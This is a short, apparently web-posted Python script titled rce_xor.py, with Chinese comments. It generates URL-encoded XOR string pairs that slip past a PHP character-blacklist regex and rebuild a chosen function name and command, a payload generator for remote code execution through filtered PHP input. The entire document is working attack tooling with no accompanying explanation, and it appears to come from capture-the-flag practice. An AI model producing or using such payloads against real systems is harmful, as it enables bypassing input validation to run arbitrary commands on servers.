&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#rce_xor.py
import re

# 预生成 XOR 映射表，存入字典
def build_xor_table():
    preg = &amp;#39;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&amp;#123;|\&amp;#125;|\~|\%|\&amp;amp;|\;&amp;#39;
    xor_map = &amp;#123;&amp;#125;
    for i in range(256):
        for j in range(256):
            if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):
                k = i ^ j
                if 32 &amp;lt;= k &amp;lt;= 126:
                    a = &amp;#39;%&amp;#39; + hex(i)[2:].zfill(2)
                    b = &amp;#39;%&amp;#39; + hex(j)[2:].zfill(2)
                    # 只存第一次找到的即可
                    if chr(k) not in xor_map:
                        xor_map[chr(k)] = (a, b)
    return xor_map


# 根据输入字符串生成异或表达式
def action(arg, xor_map):
    s1, s2 = &amp;quot;&amp;quot;, &amp;quot;&amp;quot;
    for ch in arg:
        if ch not in xor_map:
            raise ValueError(f&amp;quot;[-] 字符 &amp;#123;ch&amp;#125; 无法生成&amp;quot;)
        a, b = xor_map[ch]
        s1 += a
        s2 += b
    return f&amp;quot;(\&amp;quot;&amp;#123;s1&amp;#125;\&amp;quot;^\&amp;quot;&amp;#123;s2&amp;#125;\&amp;quot;)&amp;quot;


def main():
    xor_map = build_xor_table()
    while True:
        s1 = input(&amp;quot;\n[+] your function：&amp;quot;)
        if s1.lower() == &amp;quot;exit&amp;quot;:
            break
        s2 = input(&amp;quot;[+] your command：&amp;quot;)
        param = action(s1, xor_map) + action(s2, xor_map)
        print(&amp;quot;\n[*] result:\n&amp;quot; + param)


if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
